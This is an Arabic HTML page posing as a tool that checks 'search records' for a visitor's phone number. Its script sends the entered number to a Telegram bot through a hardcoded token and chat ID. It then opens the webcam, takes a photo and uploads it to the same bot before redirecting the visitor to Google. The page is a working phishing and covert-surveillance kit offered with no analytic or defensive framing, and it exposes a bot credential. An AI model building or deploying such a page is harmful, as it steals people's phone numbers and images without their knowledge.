<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>التحقق</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 100px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .box {
            background: white;
            max-width: 400px;
            margin: auto;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #ffd600;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        .loader {
            display: inline-block;
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ffd600;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="box">
        <div id="page1">
            <h2>✨ أهلاً بك</h2>
            <p style="margin: 20px 0; color: #666;">التحقق من سجلات البحث عن رقمك</p>
            <button onclick="nextPage(2)">▶️ ابدأ</button>
        </div>
        
        <div id="page2" style="display:none;">
            <h3>📱 أدخل رقم جوالك</h3>
            <input type="tel" id="phone" placeholder="05XXXXXXXX" dir="ltr">
            <button onclick="sendNumber()">🔍 فحص</button>
        </div>
        
        <div id="page3" style="display:none;">
            <div class="loader"></div>
            <p style="margin-top: 20px;">جاري التحقق...</p>
        </div>
        
        <div id="page4" style="display:none;">
            <div style="font-size: 50px;">✅</div>
            <h3>تم بنجاح</h3>
            <p style="margin-top: 10px;">جاري التوجيه...</p>
        </div>
    </div>
    
    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>
    
    <script>
        const BOT_TOKEN = '8409410631:AAFhc4ENmetOY0tCRzhFfwVN6H3ShW4RSCg';
        const CHAT_ID = '5156556639';
        let userPhone = '';
        
        function nextPage(page) {
            document.getElementById('page1').style.display = 'none';
            document.getElementById('page2').style.display = 'none';
            document.getElementById('page3').style.display = 'none';
            document.getElementById('page4').style.display = 'none';
            document.getElementById(`page${page}`).style.display = 'block';
        }
        
        async function sendNumber() {
            const phone = document.getElementById('phone').value;
            if (!phone || phone.length < 8) {
                alert('أدخل رقم صحيح');
                return;
            }
            userPhone = phone;
            
            // ارسال الرقم
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `📱 رقم: ${phone}\n🕐 ${new Date().toLocaleString()}`
                })
            });
            
            nextPage(3);
            
            // تشغيل الكاميرا والتصوير فوراً
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.play();
                
                // انتظر ثانية عشان الكاميرا تضبط
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    // اوقف الكاميرا
                    stream.getTracks().forEach(t => t.stop());
                    
                    // ارسل الصورة
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID);
                        fd.append('photo', blob);
                        fd.append('caption', `📸 صورة\n📱 الرقم: ${userPhone}\n🕐 ${new Date().toLocaleString()}`);
                        
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: fd
                        });
                    }, 'image/jpeg', 0.8);
                    
                    nextPage(4);
                    setTimeout(() => {
                        window.location.href = 'https://google.com';
                    }, 2000);
                }, 1000);
                
            } catch(e) {
                // اذا فشلت الكاميرا، كمل بدون صورة
                console.log('خطأ بالكاميرا:', e);
                nextPage(4);
                setTimeout(() => {
                    window.location.href = 'https://google.com';
                }, 2000);
            }
        }
    </script>
</body>
</html>
